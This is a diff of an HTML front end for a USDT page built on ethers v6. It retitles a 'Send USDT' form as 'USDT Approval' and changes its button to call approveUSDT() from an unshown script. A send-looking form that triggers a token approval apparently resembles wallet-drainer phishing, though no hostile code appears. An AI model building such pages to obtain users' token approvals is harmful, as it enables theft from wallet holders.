@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Send USDT</title>
+  <title>USDT Approval</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
-  <!-- Ethers v6 -->
+  <!-- ethers v6 -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.4/dist/ethers.umd.min.js"></script>
 
   <style>
@@ -13,7 +13,7 @@
       margin: 0;
       background: #0b0b0b;
       color: #fff;
-      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+      font-family: sans-serif;
     }
     .container {
       padding: 20px;
@@ -37,7 +37,7 @@
       color: #fff;
       font-size: 16px;
     }
-    .amount-row {
+    .row {
       display: flex;
       justify-content: space-between;
       align-items: center;
@@ -48,10 +48,10 @@
     }
     .max {
       color: #25d695;
-      font-size: 14px;
       cursor: pointer;
+      font-size: 14px;
     }
-    .next-btn {
+    .btn {
       position: fixed;
       bottom: 20px;
       left: 20px;
@@ -70,13 +70,13 @@
 
 <body>
   <div class="container">
-    <div class="label">Address</div>
+    <div class="label">Wallet Address</div>
     <div class="input-box">
-      <input id="toAddress" placeholder="0x..." disabled />
+      <input id="walletAddress" placeholder="0x..." readonly />
     </div>
 
     <div class="label">Amount</div>
-    <div class="input-box amount-row">
+    <div class="input-box row">
       <input id="amount" placeholder="0.0" />
       <div>
         <span class="token">USDT</span>
@@ -86,7 +86,7 @@
     </div>
   </div>
 
-  <button class="next-btn" onclick="approveUSDT()">Next</button>
+  <button class="btn" onclick="approveUSDT()">Approve</button>
 
   <script src="./app.js"></script>
 </body>
